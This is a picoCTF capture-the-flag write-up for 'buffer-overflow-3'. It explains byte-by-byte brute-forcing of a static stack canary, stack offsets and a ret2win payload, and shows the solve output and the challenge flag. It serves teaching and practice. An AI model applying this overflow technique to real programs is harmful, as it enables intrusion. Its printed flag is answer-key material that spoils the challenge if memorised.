# buffer-overflow-3

ret2win w/ Canary Brute-forcing

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/buffer-overflow-3/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

No PIE, so the address of `win` does not change per runtime. 

## Concept

The concept is to brute-force the canary character-by-character so that we can overwrite the return address of `vuln` without the program aborting due to canary overwrite detection. 

### Why can we brute-force the canary?

Since the canary is always loaded from a file, we know that at least for that challenge instance, the canary should stay constant between runtimes. We can therefore brute-force the canary. 

As the canary can be [brute-forced character-by-character](#brute-forcing-the-canary-character-by-character), the search space is not `2**32`, but rather `(2**8) * 4 = 1024` which is pretty reasonable. 

## Overview of Binary

In `vuln`, we can input the number of bytes we want to write in, before input the desired bytes to be written onto the stack (see code below)

```c
void vuln(){

    ...

    printf("How Many Bytes will You Write Into the Buffer?\n> ");
    while (x<BUFSIZE) {
        read(0,length+x,1);
        if (length[x]=='\n') break;
        x++;
    }
    sscanf(length,"%d",&count);

    printf("Input> ");
    read(0,buf,count);

    if (memcmp(canary,global_canary,CANARY_SIZE)) {
        printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
        fflush(stdout);
        exit(0);
    }

    ...

}
```

The only issue is that `canary` will be overwritten, and when compared with `global_canary` which is not in that stack frame, will result detect the stack smashing and abort the program. 

## Brute-forcing the Canary character-by-character

We need not brute-force the entire canary at once, since we can always only overwrite the first n byte of the 4-byte canary. 

Using gdb, we see that the canary occurs at `[ebp-0x10]`, and our input is written into `buf` at `[ebp-0x50]`. Our guess can thus (iteratively) be 

```python
b'A'*64 + canary + canary_byte_guess_byte
```

where `canary` is the concatenated byte string of the correctly-guessed bytes, while `canary_byte_guess_byte` is the byte currently being guessed. See the [solve script](./solve.py) for the specific implementation. 

## Final Payload

Since the return address occurs at `[ebp+0x4]`, our final payload is

```python
b'A'*64 + p32(canary) + b'A'*16 + p32(exe.symbols.win)
```

## Flag

```
Progress: len(canary)=0, hex(canary_byte_guess_int)='0x41'/0xff
canary=b'B'
Progress: len(canary)=1, hex(canary_byte_guess_int)='0x68'/0xff
canary=b'Bi'
Progress: len(canary)=2, hex(canary_byte_guess_int)='0x51'/0xff
canary=b'BiR'
Progress: len(canary)=3, hex(canary_byte_guess_int)='0x63'/0xff
canary=b'BiRd'
b"picoCTF{Stat1C_c4n4r13s_4R3_b4D_fba9d49b}"
```
